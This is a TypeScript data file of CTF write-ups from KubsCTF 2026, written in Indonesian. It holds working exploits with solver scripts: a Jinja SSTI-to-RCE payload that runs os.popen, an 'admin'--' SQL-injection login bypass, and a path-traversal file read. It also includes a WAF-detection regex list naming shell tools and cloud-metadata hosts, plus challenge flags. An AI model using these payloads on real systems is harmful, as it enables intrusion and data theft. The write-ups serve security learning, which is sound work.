import type { WriteUp } from "../types";

export const kubsctf2026Writeups: WriteUp[] = [
  {
    "id": "kubsctf2026-ppc-clearline",
    "title": "Clearline",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Endpoint utama menerima `GET /?expr=...`. Nilai `expr` memang divalidasi sebagai ekspresi numerik, tetapi nilai yang sama dirender ke template hasil tanpa escaping Jinja. Ini memberi SSTI dan akhirnya RCE pada proses Gunicorn.",
    "problemDescription": "Tidak ada binary ELF atau library lokal di direktori challenge. Target yang diberikan adalah aplikasi HTTP Gunicorn, sehingga `file`, `checksec`, `readelf`, `ldd`, dan analisis ELF tidak berlaku.\n\nRecon service:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Endpoint utama menerima `GET /?expr=...`. Nilai `expr` memang divalidasi sebagai ekspresi numerik, tetapi nilai yang sama dirender ke template hasil tanpa escaping Jinja. Ini memberi SSTI dan akhirnya RCE pada proses Gunicorn.",
        "code": ""
      },
      {
        "title": "Proteksi Binary",
        "content": "Tidak ada binary ELF atau library lokal di direktori challenge. Target yang diberikan adalah aplikasi HTTP Gunicorn, sehingga `file`, `checksec`, `readelf`, `ldd`, dan analisis ELF tidak berlaku.\n\nRecon service:\n\n\n\nGrammar yang ditampilkan UI: `+`, `-`, `*`, `/`, `//`, `%`, `**`, kurung, unary sign, dan literal numerik.",
        "code": "GET /                 -> 200 OK, Server: gunicorn\nGET /reference        -> grammar num-7\nGET /status           -> clearline/2.4.1"
      },
      {
        "title": "Analisis Program",
        "content": "Request normal:\n\n\n\nmenghasilkan panel:\n\n\n\nInput non-numerik seperti `__import__(\"os\")` ditolak sebagai `not a numeric expression`. Namun nilai input juga dipakai di field `Input` pada template hasil.",
        "code": "/?expr=2%2B2"
      },
      {
        "title": "Vulnerability",
        "content": "Payload probe:\n\n\n\nField `Input` berubah menjadi `49`. Ini membuktikan SSTI Jinja, bukan sekadar evaluasi calculator. Context template juga mengekspos object bawaan seperti `cycler`.\n\nPrimitive RCE yang terbukti:\n\n\n\nOutput service:\n\n\n\nWorking directory proses adalah `/app`.",
        "code": "{{7*7}}"
      },
      {
        "title": "Strategi Exploit",
        "content": "`cycler.__init__.__globals__` memberi akses ke globals Python milik Jinja. Dari sana `os.popen()` dapat menjalankan command dalam container challenge. Flag ditemukan pada `/flag.txt`.\n\nPayload final:\n\n\n\nPayload dikirim sebagai parameter GET dan URL-encoded oleh `solve.py`. Script mengambil isi `<dd class=\"rrow__mono rrow__expr\">...</dd>`, memvalidasi bahwa payload benar-benar terevaluasi, lalu mencetak flag.",
        "code": "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
      },
      {
        "title": "Hasil",
        "content": "Flag muncul langsung dari output challenge:",
        "code": "<FLAG>kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}</FLAG>"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nfrom html import unescape\nfrom pathlib import Path\nimport os\nimport re\nimport sys\nfrom urllib.parse import urlencode\nfrom urllib.request import Request, build_opener\n\n\nBASE_DIR = Path(__file__).resolve().parent\nDEFAULT_HOST = \"159.194.244.226\"\nDEFAULT_PORT = 8082\nPAYLOAD = \"{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}\"\n\n\ndef fetch_flag(url: str) -> str:\n    query = urlencode({\"expr\": PAYLOAD})\n    request = Request(f\"{url.rstrip('/')}?{query}\", headers={\"User-Agent\": \"clearline-solver/1.0\"})\n    body = build_opener().open(request, timeout=8).read().decode(\"utf-8\", \"replace\")\n\n    match = re.search(r'<dd class=\"rrow__mono rrow__expr\">(.*?)</dd>', body, re.S)\n    if not match:\n        raise RuntimeError(\"response tidak memiliki field Input pada result panel\")\n\n    value = unescape(re.sub(r\"<[^>]+>\", \"\", match.group(1))).strip()\n    if not value:\n        raise RuntimeError(\"field Input kosong; SSTI mungkin tidak dieksekusi\")\n    if \"{{\" in value or \"cycler\" in value:\n        raise RuntimeError(f\"payload tidak terevaluasi: {value!r}\")\n    return value\n\n\ndef main() -> None:\n    # REMOTE HOST=... PORT=... mengikuti konvensi pwntools-style challenge scripts.\n    remote = \"REMOTE\" in sys.argv[1:]\n    host = os.environ.get(\"HOST\", DEFAULT_HOST)\n    port = int(os.environ.get(\"PORT\", DEFAULT_PORT))\n    if remote or len(sys.argv) == 1:\n        url = os.environ.get(\"URL\", f\"http://{host}:{port}/\")\n    else:\n        url = sys.argv[1]\n\n    print(f\"[*] target: {url}\")\n    print(f\"[*] payload: {PAYLOAD}\")\n    flag = fetch_flag(url)\n    print(f\"[+] flag: {flag}\")\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-gridlock",
    "title": "Gridlock",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Service challenge menyediakan form login di `http://159.194.244.226:8081/`.\nQuery login dibangun tanpa escaping atau parameter binding. Username `admin'--`\nmemotong sisa query SQL setelah username, sehingga password tidak lagi diverifikasi.\nSession yang dihasilkan memiliki akses admin dan halaman `/console` menampilkan master key.",
    "problemDescription": "Direktori challenge tidak menyediakan binary, library, source, atau Docker image.\nTarget yang tersedia adalah service HTTP berbasis Gunicorn, berdasarkan header:\n\nKarena tidak ada ELF lokal, pemeriksaan `file`, `checksec`, `readelf`, `ldd`, dan\nanalisis GDB tidak berlaku untuk challenge ini.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Service challenge menyediakan form login di `http://159.194.244.226:8081/`.\nQuery login dibangun tanpa escaping atau parameter binding. Username `admin'--`\nmemotong sisa query SQL setelah username, sehingga password tidak lagi diverifikasi.\nSession yang dihasilkan memiliki akses admin dan halaman `/console` menampilkan master key.",
        "code": ""
      },
      {
        "title": "Artefak dan Proteksi Binary",
        "content": "Direktori challenge tidak menyediakan binary, library, source, atau Docker image.\nTarget yang tersedia adalah service HTTP berbasis Gunicorn, berdasarkan header:\n\n\n\nKarena tidak ada ELF lokal, pemeriksaan `file`, `checksec`, `readelf`, `ldd`, dan\nanalisis GDB tidak berlaku untuk challenge ini.",
        "code": "Server: gunicorn"
      },
      {
        "title": "Analisis Program",
        "content": "Halaman `/` menampilkan form:\n\n\n\nKredensial biasa menghasilkan `401 Unauthorized` dengan pesan `Invalid credentials.`.\nRequest dengan username `admin'--` dan password sembarang menghasilkan:\n\n\n\nSetelah redirect, `/console` mengonfirmasi `session active`, operator `admin`, role\n`admin`, dan access tier `Full`.",
        "code": "POST /login\nusername=<input>\npassword=<input>"
      },
      {
        "title": "Vulnerability",
        "content": "Username dikirim sebagai string SQL yang tidak diamankan. Payload:\n\n\n\nmenutup string username, lalu `--` mengomentari bagian query yang seharusnya\nmemeriksa password. Ini adalah SQL injection pada autentikasi.\n\nPayload ini dibuktikan pada service dengan beberapa kombinasi password, termasuk\n`x`, sehingga bypass tidak bergantung pada password yang benar.",
        "code": "admin'--"
      },
      {
        "title": "Primitive",
        "content": "Primitive yang terbukti:\n\n\n\nTidak ada stack/heap/RIP primitive karena target yang diberikan bukan native binary.",
        "code": "Authentication bypass sebagai user admin\nRedirect terverifikasi ke /console\nAdmin session cookie diterbitkan oleh service\nArbitrary password tidak diperlukan"
      },
      {
        "title": "Strategi Exploit",
        "content": "1. Buat HTTP session agar cookie tetap tersedia.\n2. POST ke `/login` dengan `username=admin'--` dan password `x`.\n3. Pastikan respons adalah `302 /console`.\n4. GET `/console` menggunakan session yang sama.\n5. Ambil nilai dari elemen HTML `p.key-value`.",
        "code": ""
      },
      {
        "title": "Hasil",
        "content": "Exploit berhasil dan master key muncul langsung pada response `/console`:",
        "code": "<FLAG>kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}</FLAG>"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\n\"\"\"GRIDLOCK authentication bypass exploit.\n\nUsage:\n    python3 solve.py\n    python3 solve.py HOST=159.194.244.226 PORT=8081\n    python3 solve.py URL=http://159.194.244.226:8081\n\"\"\"\n\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nDEFAULT_URL = \"http://159.194.244.226:8081\"\nINJECTION = \"admin'--\"\n\n\ndef option(name, default=None):\n    prefix = name + \"=\"\n    for arg in sys.argv[1:]:\n        if arg.startswith(prefix):\n            return arg[len(prefix):]\n    return os.environ.get(name, default)\n\n\ndef main():\n    url = option(\"URL\")\n    if not url:\n        host = option(\"HOST\", \"159.194.244.226\")\n        port = option(\"PORT\", \"8081\")\n        url = f\"http://{host}:{port}\"\n    url = url.rstrip(\"/\")\n\n    session = requests.Session()\n    response = session.post(\n        url + \"/login\",\n        data={\"username\": INJECTION, \"password\": \"x\"},\n        allow_redirects=False,\n        timeout=10,\n    )\n    if response.status_code != 302 or response.headers.get(\"Location\") != \"/console\":\n        raise RuntimeError(\n            f\"login bypass failed: status={response.status_code} \"\n            f\"location={response.headers.get('Location')!r}\"\n        )\n    print(f\"[+] bypass accepted: {response.status_code} {response.headers['Location']}\")\n\n    console = session.get(url + \"/console\", timeout=10)\n    console.raise_for_status()\n    if \"session active\" not in console.text or \"admin\" not in console.text:\n        raise RuntimeError(\"console response did not confirm an admin session\")\n\n    match = re.search(r\"<p class=\\\"key-value\\\">([^<]+)</p>\", console.text)\n    if not match:\n        raise RuntimeError(\"master key was not present in console response\")\n\n    print(f\"[+] console: {console.status_code} {console.url}\")\n    print(f\"<FLAG>{match.group(1)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{gr1dl0ck_4dm1n_byp4ss_a59c3848}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-honeyleaf",
    "title": "Honeyleaf",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Service adalah Flask archive receipt pada `http://159.194.244.226:8083/`. Endpoint `/view` membaca file berdasarkan parameter `file`. Parameter ini bisa diarahkan keluar dari direktori receipt menggunakan absolute path atau traversal.",
    "problemDescription": "Tidak ada binary native pada direktori challenge. Service berjalan dengan Gunicorn dan Python 3.12, berdasarkan `/proc/self/cmdline`:\n\nSource `app.py` dapat dibaca melalui traversal dengan request `file=../app.py`. Konfigurasi archive dan handler yang relevan:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Service adalah Flask archive receipt pada `http://159.194.244.226:8083/`. Endpoint `/view` membaca file berdasarkan parameter `file`. Parameter ini bisa diarahkan keluar dari direktori receipt menggunakan absolute path atau traversal.",
        "code": ""
      },
      {
        "title": "Proteksi Binary",
        "content": "Tidak ada binary native pada direktori challenge. Service berjalan dengan Gunicorn dan Python 3.12, berdasarkan `/proc/self/cmdline`:",
        "code": "/usr/local/bin/python3.12 /usr/local/bin/gunicorn --user ctf --group ctf -b 0.0.0.0:8080 -w 1 --threads 4 ... app:app"
      },
      {
        "title": "Analisis Program",
        "content": "Source `app.py` dapat dibaca melalui traversal dengan request `file=../app.py`. Konfigurasi archive dan handler yang relevan:\n\n\n\nKomentar TODO di source juga menyatakan validasi nama file belum ditambahkan.",
        "code": "RECEIPTS_DIR = os.environ.get(\"RECEIPTS_DIR\", \"/app/receipts\")\n\nname = request.args.get(\"file\", \"\")\npath = os.path.join(RECEIPTS_DIR, name)\nwith open(path, \"r\", encoding=\"utf-8\", errors=\"replace\") as handle:\n    content = handle.read(MAX_VIEW_CHARS + 1)"
      },
      {
        "title": "Vulnerability",
        "content": "`os.path.join(RECEIPTS_DIR, name)` tidak membatasi hasil path ke `RECEIPTS_DIR`. Jika `name` adalah `/etc/passwd`, hasil join menjadi `/etc/passwd`. Jika memakai `../../flag.txt`, path keluar dari `/app/receipts`.\n\nPrimitive ini terbukti dengan membaca:\n\n- `/etc/passwd`, yang mengembalikan daftar user container.\n- `../app.py`, yang mengembalikan source aplikasi.\n- `/proc/self/cmdline`, yang mengungkap proses Gunicorn.",
        "code": ""
      },
      {
        "title": "Strategi Exploit",
        "content": "Request exploit yang digunakan:\n\n\n\n`/flag.txt` dibaca oleh `open()` lalu dimasukkan ke elemen `<pre class=\"receipt\">`. Script mengambil isi elemen tersebut, melakukan HTML unescape, memvalidasi bentuk flag, dan mencetaknya.",
        "code": "GET /view?file=%2Fflag.txt HTTP/1.1"
      },
      {
        "title": "Hasil",
        "content": "Exploit dijalankan terhadap service challenge yang diberikan dan mengembalikan:",
        "code": "<FLAG>kubstu{h0n3yl34f_p4th_tr4v3rs4l_defd1128}</FLAG>"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nfrom pathlib import Path\nfrom urllib.parse import urlencode\nfrom urllib.request import Request, urlopen\nimport re\n\nfrom pwn import args, context, log\n\n\nBASE_DIR = Path(__file__).resolve().parent\ncontext.log_level = \"info\"\n\n\ndef target_url():\n    if args.REMOTE:\n        host = args.HOST or \"159.194.244.226\"\n        port = int(args.PORT or 8083)\n        scheme = args.SCHEME or \"http\"\n        return f\"{scheme}://{host}:{port}\"\n    return args.URL or \"http://127.0.0.1:8080\"\n\n\ndef read_file(base, filename):\n    query = urlencode({\"file\": filename})\n    request = Request(f\"{base}/view?{query}\", headers={\"User-Agent\": \"honeyleaf-solve/1.0\"})\n    with urlopen(request, timeout=10) as response:\n        body = response.read().decode(\"utf-8\", \"replace\")\n\n    match = re.search(r'<pre class=\"receipt\">(.*?)</pre>', body, re.S)\n    if not match:\n        raise RuntimeError(f\"target did not return a readable file for {filename!r}\")\n    # The receipt template escapes content; unescape only after extracting it.\n    import html\n    return html.unescape(match.group(1))\n\n\ndef exploit():\n    base = target_url()\n    log.info(\"target: %s\", base)\n    content = read_file(base, \"/flag.txt\")\n    flag = content.strip()\n    if not re.fullmatch(r\"[A-Za-z0-9_{}-]+\", flag) or \"{\" not in flag:\n        raise RuntimeError(f\"unexpected flag response: {flag!r}\")\n    log.success(\"flag: %s\", flag)\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    exploit()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{h0n3yl34f_p4th_tr4v3rs4l_defd1128}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-matryoshka",
    "title": "Matryoshka",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Analisis & Solusi",
        "content": "Layer 1 of 10.\nThe comment of the archive you just opened is the password for level02.zip; `unzip -z` prints it.\n",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{t3n_l4y3rs_d33p_991939c0}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-mobilewaf2",
    "title": "Mobile Waf 2",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Service meminta verdict `allow` atau `block` untuk 100 request JSON. Request harus diblokir hanya jika membawa struktur serangan yang dapat dieksekusi.",
    "problemDescription": "- Service remote yang diberikan pada `193.168.46.146:32714`.\n- `auto.py`: solver heuristik yang membaca request per ronde dan mengirim verdict.\n\nTidak ada artefak lokal di direktori challenge. Banner service menjelaskan protokol satu JSON per baris, batas waktu 3 detik per ronde, dan total 100 ronde.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Service meminta verdict `allow` atau `block` untuk 100 request JSON. Request harus diblokir hanya jika membawa struktur serangan yang dapat dieksekusi.",
        "code": ""
      },
      {
        "title": "File Challenge",
        "content": "- Service remote yang diberikan pada `193.168.46.146:32714`.\n- `auto.py`: solver heuristik yang membaca request per ronde dan mengirim verdict.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "Tidak ada artefak lokal di direktori challenge. Banner service menjelaskan protokol satu JSON per baris, batas waktu 3 detik per ronde, dan total 100 ronde.",
        "code": ""
      },
      {
        "title": "Analisis Static / dynamic",
        "content": "Analisis dilakukan secara dinamis terhadap service yang alamatnya diberikan oleh challenge. Request benign biasanya berupa endpoint katalog, login normal, order, dan webhook. Request malicious muncul sebagai variasi:\n\n- SQL injection, termasuk `UNION SELECT`, blind/time-based SQLi, stacked query, dan komentar `/**/`.\n- XSS dan template injection pada parameter, header, serta body.\n- SSRF menuju loopback, private network, metadata cloud, IPv4 alternatif, IPv6-mapped address, dan DNS rebinding.\n- LFI/path traversal dengan encoding berlapis, backslash, overlong UTF-8, dan `%u` encoding.\n- Command injection, Shellshock, PowerShell, serialized payload, tar checkpoint, dan downloader yang menulis file executable.\n- Prototype pollution, deserialization, XXE, header injection, request smuggling, parameter pollution, dan open redirect.",
        "code": ""
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "`auto.py` melakukan URL decoding berulang, lalu memeriksa pola serangan pada path, query, body, dan header. Cookie ikut diperiksa karena beberapa ronde menyisipkan payload di sana, sementara token CSRF dan bearer token normal tidak dianggap serangan. Verdict dikirim segera agar memenuhi batas 3 detik.",
        "code": ""
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Jalankan:\n\n\n\nEksekusi berhasil menghasilkan respons service:",
        "code": "source /home/nata/ctf_env/bin/activate\npython auto.py"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`auto.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\nimport base64, json, re, socket, time\nfrom urllib.parse import unquote_plus\n\nHOST, PORT = \"193.168.46.146\", 32714\nVERBOSE = False\n\ndef verdict(req):\n    # Inspect all attacker-controlled request fields, while excluding ordinary\n    # cookie/token noise from the pattern matching.\n    fields = [str(req.get(\"path\", \"\")), str(req.get(\"query\", \"\")),\n              str(req.get(\"body\", \"\"))]\n    headers = req.get(\"headers\", {}) or {}\n    fields += [str(k) + \":\" + str(v) for k, v in headers.items()\n               if k.lower() not in {\"authorization\", \"x-csrf-token\"}]\n    def decode(value):\n        for _ in range(3):\n            new = unquote_plus(value)\n            if new == value:\n                break\n            value = new\n        return value\n    decoded_fields = [decode(x) for x in fields]\n    raw_s = \"\\n\".join(fields).lower()\n    if \"base64\" in \"\\n\".join(decoded_fields).lower():\n        for token in re.findall(r\"[A-Za-z0-9+/]{12}={0,2}\", \"\\n\".join(decoded_fields)):\n            try:\n                decoded_fields.append(base64.b64decode(token + \"=\" * (-len(token) % 4)).decode(\"utf-8\", \"ignore\"))\n            except Exception:\n                pass\n    s = \"\\n\".join(decoded_fields)\n    sl = s.lower()\n    scan = sl + \"\\n\" + re.sub(r\"/\\*.*?\\*/\", \"\", sl, flags=re.S)\n\n    patterns = [\n        r\"<script(?:\\s|>)\", r\"</script\", r\"javascript\\s*:\",\n        r\"on(?:error|load|click|mouseover)\\s*=\", r\"<svg[^>]*on\",\n        r\"(?:;|\\b)\\s*alert\\s*\\(\", r\"document\\.cookie\",\n        r\"union\\s+(?:all\\s+)?select\",\n        r\"(?:\\(\\s*select\\s+.+\\s+from\\s+\\w+|insert\\s+into)\\b\",\n        r\"(?:['\\\"]\\s*(?:or|and)\\s+['\\\"]?\\w+['\\\"]?\\s*=\\s*['\\\"]?\\w+['\\\"]?|\\bor\\s+1\\s*=\\s*1)\",\n        r\"(?:admin\\s*['\\\"]\\s*--|['\\\"]\\s*--\\s*(?:$|&))\",\n        r\";\\s*(?:drop\\s+table|delete\\s+from|update\\s+\\w+\\s+set|insert\\s+into)\\b\",\n        r\"(?:case\\s+when\\s*\\(|sleep\\s*\\(|benchmark\\s*\\(|waitfor\\s+delay)\",\n        r\"(?:updatexml|extractvalue|concat\\s*\\(\\s*0x|load_file\\s*\\()\",\n        r\"(?:cast\\s*\\(\\s*\\(\\s*select|convert\\s*\\(\\s*\\(\\s*select)\",\n        r\"(?:\\$where|\\$ne\\b|\\$regex\\b|\\$gt\\b|\\$func\\b|\\$expr\\b|\\$accumulator\\b|__class__|__reduce__|pickle|!!python|!!java|javax\\.script|scriptenginemanager|objectinputstream|AAEAAAD|rO0AB|gAS[A-Za-z0-9]|BAhv|O:\\d+:\\\"|C:\\d+:\\{|R:\\d+;)\",\n        r\"(?:;|&&|\\|)\\s*(?:id|whoami|cat|ls|sh|bash|curl|wget|nc|python3?|perl|ruby|node|php|awk|sed|find|echo|base64)\\b\",\n        r\"\\$\\([^)]*(?:id|whoami|cat|sh|bash|curl|wget)\",\n        r\"`[^`]*(?:id|whoami|cat|sh|bash|curl|wget)\",\n        r\"(?:/bin/(?:sh|bash)|cmd\\.exe|powershell(?:\\.exe)?)\",\n        r\"\\(\\)\\s*\\{\",\n        r\"(?:^|\\s)(?:-o|--output|-write)\\s+[^\\s]+\\.(?:php|phtml|jsp|jspx|asp|aspx|sh)\\b\",\n        r\"(?:-i|--input)\\s+/etc/(?:passwd|shadow|hosts)|-f\\s+concat[^\\n]+/etc/\",\n        r\"(?:--checkpoint(?:=|\\s)|checkpoint-action\\s*=\\s*exec)\",\n        r\"(?:-exec\\s+[^\\n]+(?:sh|bash|python)|\\b(?:docker|kubectl)\\s+(?:run|exec)|\\b(?:awk|sed)\\s+[^\\n]*(?:system|/bin/sh))\",\n        r\"(?:ext::(?:sh|bash)|(?:python|python3|perl|ruby|node|php)\\s+(?:-c|--eval)|(?:bash|sh)\\s+-c|--post-file\\s*=\\s*/etc/|(?:curl|wget)\\s+[^\\n]*(?:\\||-o\\s+))\",\n        r\"(?:\\.\\./){2}|(?:\\.\\./|\\.\\.\\\\){1}|\\.\\./\\.|\\.\\.;/|\\.\\./.*\\.\\./\",\n        r\"(?:(?:layout|file|path|template|source|name)\\s*=\\s*[A-Za-z]:\\\\+(?:windows|users|boot)|(?:php|data|expect|zip)://(?:filter|input|id|)|file:///(?:etc|proc|home)|(?:file|path|template|source|name|f|url|avatar_url)\\s*=\\s*(?:file://)?/(?:etc|proc|home)|/proc/(?:self|\\d+)/(?:environ|cmdline|maps))\",\n        r\"(?:__proto__|constructor\\s*\\[|constructor\\s*\\]\\s*\\[\\s*prototype|prototype\\s*\\[)\",\n        r\"(?:\\{\\{[^}]*(?:[+*/-]|\\(|__|config|cycler|self|os\\.)[^}]*\\}\\}|<%[^%]+%>|#\\{[^}]+\\}|\\$\\{(?:\\d+\\s*[+*\\-/]|jndi:))\",\n        r\"(?:freemarker|template\\.utility|runtime\\.getruntime|java\\.lang\\.runtime|getruntime\\s*\\(\\)|__globals__|%\\s*\\{\\s*\\()\",\n        r\"(?:\\{php\\}|shell_exec\\s*\\(|system\\s*\\(\\s*['\\\"](?:id|whoami|cat))\",\n        r\"(?:smarty_internal|writefile\\s*\\(|<\\?php|system\\s*\\(\\s*\\$_)\",\n        r\"(?:\\$\\{\\{[^\\n]*(?:<%|\\[%)[^\\n]*|\\{\\{\\s*<%)\",\n        r\"(?:ldap|ldaps)://|gopher://\",\n        r\"(?:127\\.0\\.0\\.1|127\\.1(?:\\D|$)|127-0-0-1|0177\\.0\\.0\\.1|localhost(?:\\.localdomain)?|0\\.0\\.0\\.0|169\\.254\\.169\\.254|169\\.254\\.170\\.2|169-254-169-254|100\\.100\\.100\\.200|metadata\\.google\\.internal|instance-data\\.ec2\\.internal|kubernetes\\.default\\.svc|host\\.docker\\.internal|rebind\\.example|(?:nip|xip)\\.io|7f000001|2130706433|2852039166|\\[::1\\]|(?:https?|ftp|file|gopher)://0(?:[:/])|\\w+://(?:10\\.|192\\.168\\.|172\\.(?:1[6-9]|2\\d|3[0-1])\\.))\",\n        r\"(?:xlink:href|srcdoc)\\s*=\",\n        r\"(?:<!doctype\\s+[^>]*\\[|<!entity\\s+\\w+\\s+(?:system|public))\",\n        r\"(?:transfer-encoding\\s*:\\s*chunked.*content-length|content-length\\s*:.*transfer-encoding)\",\n        r\"(?:role|isadmin|admin)\\s*=\\s*\\w+\\s*;\\s*(?:role|isadmin|admin)\\s*=\",\n        r\"(?:^|\\n)\\s*x-(?:forwarded-)?host\\s*:\",\n        r\"(?:^|\\n)\\s*x-(?:rewrite|original)-url\\s*:\",\n        r\"(?:^|\\n)\\s*x-(?:remote-user|authenticated-groups|user|role)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{w4f_g4untl3t_100_r0unds_7efe80548a64}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-transmission",
    "title": "Transmission",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Artefak challenge hanya `transmission.wav`, bukan ELF binary. Karena itu jalur penyelesaiannya adalah demodulasi sinyal audio. Flag dikirim sebagai bitmap 8-bit menggunakan delapan frekuensi paralel.",
    "problemDescription": "Tidak ada metadata berisi flag dan `binwalk` tidak menemukan file tersemat.\n\nSpektrum menunjukkan delapan kanal dengan jarak 480 Hz:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Artefak challenge hanya `transmission.wav`, bukan ELF binary. Karena itu jalur penyelesaiannya adalah demodulasi sinyal audio. Flag dikirim sebagai bitmap 8-bit menggunakan delapan frekuensi paralel.",
        "code": ""
      },
      {
        "title": "Analisis File",
        "content": "Tidak ada metadata berisi flag dan `binwalk` tidak menemukan file tersemat.",
        "code": "RIFF WAVE, PCM signed 16-bit, mono, 22050 Hz\nDurasi: 14.51 detik\nUkuran: 640 kB"
      },
      {
        "title": "Sinyal",
        "content": "Spektrum menunjukkan delapan kanal dengan jarak 480 Hz:\n\n\n\nSetiap kanal adalah satu bit pada mask 8-bit. Contoh mask awal yang terdeteksi adalah `0xfe`, `0x08`, `0x14`, dan `0x22`. Mask ini bukan ASCII langsung; mask tersebut adalah kolom-kolom glyph bitmap.\n\nDurasi satu kolom sekitar 70 ms. Run yang lebih panjang harus diperluas, misalnya mask yang bertahan sekitar 210 ms menjadi tiga kolom identik. Setelah bit order dibalik, kolom dipisahkan oleh mask kosong `0x00` dan membentuk glyph 5x7.\n\n![Decoded bitmap](/assets/writeups/kubsctf_2026/ppc-transmission/decoded_bitmap.png)\n\n![First decoded bitmap](/assets/writeups/kubsctf_2026/ppc-transmission/decoded_first.png)",
        "code": "2440, 2920, 3400, 3880, 4360, 4840, 5320, 5800 Hz"
      },
      {
        "title": "Decoder",
        "content": "`solve.py` melakukan langkah berikut:\n\n1. Membaca WAV mono 16-bit.\n2. Mengukur energi pada delapan frekuensi dengan korelasi kompleks.\n3. Membentuk mask bit menggunakan ambang energi 20.000.\n4. Menggabungkan run dan memperluasnya dengan basis 70 ms.\n5. Membalik urutan bit setiap mask.\n6. Memetakan glyph bitmap ke karakter.\n\nJalankan:\n\n\n\nOutput validasi:",
        "code": "python3 solve.py"
      },
      {
        "title": "Hasil",
        "content": "<FLAG>kubstu{he4r_the_picture_8a72}</FLAG>",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nfrom pathlib import Path\nimport wave\n\nimport numpy as np\n\n\nBASE_DIR = Path(__file__).resolve().parent\nWAV_PATH = BASE_DIR / \"transmission.wav\"\n\n\n# The challenge uses a small 5x7-style glyph set. Values here are columns\n# after reversing the bit order of the demodulated frequency mask.\nGLYPHS = {\n    bytes.fromhex(\"7f102844\"): \"k\",\n    bytes.fromhex(\"3c4040407c\"): \"u\",\n    bytes.fromhex(\"7f44444438\"): \"b\",\n    bytes.fromhex(\"4854545424\"): \"s\",\n    bytes.fromhex(\"043f444440\"): \"t\",\n    bytes.fromhex(\"083e4141\"): \"{\",\n    bytes.fromhex(\"7f04040478\"): \"h\",\n    bytes.fromhex(\"4149494936\"): \"e\",\n    bytes.fromhex(\"1814127f10\"): \"4\",\n    bytes.fromhex(\"7c08040404\"): \"r\",\n    bytes.fromhex(\"8080808080\"): \"_\",\n    bytes.fromhex(\"fc44444438\"): \"p\",\n    bytes.fromhex(\"427f40\"): \"i\",\n    bytes.fromhex(\"3844444444\"): \"c\",\n    bytes.fromhex(\"3649494936\"): \"8\",\n    bytes.fromhex(\"2054545478\"): \"a\",\n    bytes.fromhex(\"0171090503\"): \"7\",\n    bytes.fromhex(\"4261514946\"): \"2\",\n    bytes.fromhex(\"41413e08\"): \"}\",\n}\n\n\ndef reverse_bits(value: int) -> int:\n    return int(f\"{value:08b}\"[::-1], 2)\n\n\ndef demodulate(path: Path) -> bytes:\n    with wave.open(str(path), \"rb\") as wav:\n        if wav.getnchannels() != 1 or 